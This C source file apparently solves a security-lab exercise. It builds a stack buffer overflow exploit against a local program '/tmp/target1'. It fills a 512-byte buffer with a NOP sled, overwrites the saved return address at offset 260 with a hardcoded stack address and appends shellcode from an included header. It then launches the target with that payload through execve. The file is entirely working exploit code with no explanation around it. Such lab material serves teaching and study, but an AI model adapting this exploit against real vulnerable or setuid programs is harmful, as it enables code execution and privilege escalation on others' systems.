#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP 0x90

#define len 512

char payload[len];

void make_payload(){
  int i = 0;
  for(i = 0; i < len; i++)
    payload[i] = NOP;

  //Buf 256 bytes
  //EBP 4   bytes
  //Want to Send to Address: 0xbffffc74
  payload[260] = 0x74;
  payload[261] = 0xfc;
  payload[262] = 0xff;
  payload[263] = 0xbf;

  strncpy(payload+264, shellcode, 45);

  payload[len-1] = 0x00;
}

int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  make_payload();

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

